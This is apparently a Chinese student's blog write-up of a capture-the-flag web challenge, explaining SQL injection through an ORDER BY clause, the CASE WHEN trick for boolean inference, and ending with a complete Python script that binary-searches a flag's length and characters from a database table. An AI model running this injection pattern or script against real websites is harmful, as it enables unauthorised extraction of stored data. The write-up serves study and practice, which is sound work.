---
title: "ISCTF kaqi's weapon shop(排序注入)"
image: '/images/140552223_p0_master1200.jpg'
pinned: false
comment: true
published: 2026-02-01
description: "复现"
category: 学习
tags: [学习]
---

# #	重生之我要变成sql高手

好啦，别看标题，我只是想检验一下我之前花费一段时间学习sql的成果。

结果嘛，怎么讲，研究过一段时间的sql后，做题确实是有技巧了起来，nssctf上也刷了不少，但总感觉，每次一旦题目的waf超过我遇见的，我就会立马陷入不知道怎么办的境地。

究其原因，大抵是我本身就不是真正学习完数据库的，知识点啊，函数啊，版本不同的区别啊，sql注入的类型啊，以及后端源码的认知等等，这些都限制了我自己，使得我没有办法完成哪些我没见过的题目。

所以说，在ctf上，能学的真的是学不完，之前打ccb的时候，也是这种感觉，unictf和京华杯亦然，经验太少了。

能做的也只有将这些题目记录在这里，来让自己在记录的过程中边学习边做笔记，争取下次遇到类似的题目不至于裂开，发呆。

---

**闲话太多了，这边开始正题。**

这道sql题目就是一道新类型，看官方的wp叫做 **排序注入** ，也是服了，字符型注入，数字型注入，布尔盲注，时间注入，堆叠注入，二次注入，现在又来一个排序注入，sql注入这么多的吗？？？

先从排序注入开始：

排序注入产生的条件，是由于要实现自由选择类型的功能，后端代码存在一个拼接字符串的行为，类似：

`sql = "SELECT * FROM products ORDER BY " + sometings;`

![image-20260201111203147](/images/image-20260201111203147.png)

这便是为什么测试了id和-id，就可以发现的点。

在这道题里如果没有发现这个id是在by后面的话，大概率就是陷入其他类型的sql注入和waf中出不来了，我记得当时我的想法就是利用二分法比较flag的每一个字符来做，结果当然是失败了。

第一个难点过去后，迎面而来的便是waf，然后就是一张你干什么的表情包了，那个表情包我还留着呢。

![image-20260201111653859](/images/image-20260201111653859.png)

说实话，这一点我正在做，我计划做一个fuzz的字典，将函数，注释符，以及其他字符分开来，到时候就不必一个一个的查询来做，而是直接通过字典来确定能通过waf的函数，关键字等等来确定注入的方向和语句。

其实后面的思路跟我那个比较大小有异曲同工之妙，也是通过布尔的真假比较判断来进行二分法得知flag，思路算是对的，只是不知道排序注入。

![image-20260201112136601](/images/image-20260201112136601.png)

学到了，我还真不知道sql里面没有if和else的说法，既然都看到了，顺便理解一下case  when的用法。

偷个简单的语句：	`ORDER BY (CASE WHEN (1=1) THEN -id ELSE id END)`

当前面的1=1成立时，返回-id，不成立是返回id，类似如果不case就then，case就else。

对了，这边其实跟我理解的还是有一点不一样，sql语句中只是没有像我们正常写代码里面的流程控制语句，sql只看重结果(**个人理解，仅代表这个时候的个人**)。

![image-20260201112915290](/images/image-20260201112915290.png)

让哈吉米生动一下。

ok，回到第三个难点，题目最后有放出flag在/flag里面，意思就是flag存在flag表里面，我们需要从flag表里拿到flag。

![image-20260201113049561](/images/image-20260201113049561.png)

卡奇大佬还是太厉害了，这边浅显易懂。

也是一下子给我加了一个知识点，我之前还以为mysql，postagesql，这种名字都是指同一个类型的sql语言，只是版本不同。

原来是数据库类型不同，突然想起直接叶学长问我mysql和sqlite有什么区别，大师，我快悟了!!!

就跟wp里面一样，也是一下子给我加了一个知识点，我之前还以为mysql，postagesql，这种名字都是指同一个类型的sql语言，只是版本不同。

当理解了这一切之后，最后便是payload。

这种二分法如果不是写脚本，手打能累死，所以到了研究脚本的时候。

```
import re
import requests

URL = 'url'
SELECT = 'SELECT '
FROM = ' FROM '
#配置

SQL_CASE = 'CASE WHEN ({expr}) THEN -id ELSE id END, id'
SQL_LEN_FLAG = f"(({SELECT}length(flag){FROM}flag LIMIT 0,1)>={{mid}})"
SQL_CHAR = "(({SELECT}flag{FROM}flag LIMIT 0,1)>='{pre}')"
#sql语句配置

def req(payload):
    try:
        params = {'id': payload, 'p': 1}
        r = requests.get(URL, params=params, timeout=10)
        return r.text
    except:
        return ""
        #发送请求

def is_descending(text):
    pat = r'编号.*?(\d+)<'
    r = re.search(pat, text)
    if not r:
        return False
    return int(r.group(1)) == 8
    #确定正逆序排列

def ask(expr):
    payload = SQL_CASE.format(expr=expr)
    return is_descending(req(payload))

def binary_search_len(low=1, high=64):
    while low <= high:
        mid = (low + high) // 2
        if ask(SQL_LEN_FLAG.format(mid=mid)):
            low = mid + 1
        else:
            high = mid - 1
    return high
    #flag长度搜索

def binary_search_char(prefix, low=32, high=126):
    while low <= high:
        mid = (low + high) // 2
        test_str = prefix + chr(mid)
        expr = SQL_CHAR.format(SELECT=SELECT, FROM=FROM, pre=test_str)
        if ask(expr):
            low = mid + 1
        else:
            high = mid - 1
    return chr(high)
    #逐个找字符

def run():
    length = binary_search_len()
    print(f"Length: {length}")
    flag = ''
    for i in range(length):
        char = binary_search_char(flag)
        flag += char
        print(f"\rFlag: {flag}", end='')
    print(f"\nDone: {flag}")

if __name__ == '__main__':
    run()
```

这是我综合官方wp和ai，还有自己一点一点理解的过程，搓出来的脚本。

结构算是有进行一定的注释，虽然还有一些点不懂，但是依靠多次的手敲，也是熟悉了。

目前能做到只依靠自己敲出这段代码。

---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
